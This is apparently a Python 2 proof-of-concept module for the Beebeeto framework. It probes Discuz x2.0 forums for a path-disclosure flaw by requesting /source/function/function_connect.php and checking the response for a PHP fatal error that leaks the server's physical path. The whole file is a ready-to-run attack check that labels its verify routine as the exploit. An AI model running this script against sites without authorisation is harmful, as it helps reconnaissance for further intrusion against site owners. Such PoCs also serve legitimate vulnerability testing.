#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0076',
            'name': 'Discuz x2 /source/function/function_connect.php 泄漏服务器物理路径 POC',
            'author': '1024',
            'create_date': '2014-10-17',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Discuz',
            'vul_version': ['x2.0'],
            'type': 'Information Disclosure',
            'tag': ['Discuz漏洞', '爆物理路径漏洞', '/function_connect.php'],
            'desc': 'N/A',
            'references': ['http://sebug.net/vuldb/ssvid-24254',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        verify_url = args['options']['target'] + '/source/function/function_connect.php'
        req = urllib2.Request(verify_url)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(req).read()
        if '<b>Fatal error</b>:' in content and '/function_connect.php</b>' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
            return args
        args['success'] = False
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())
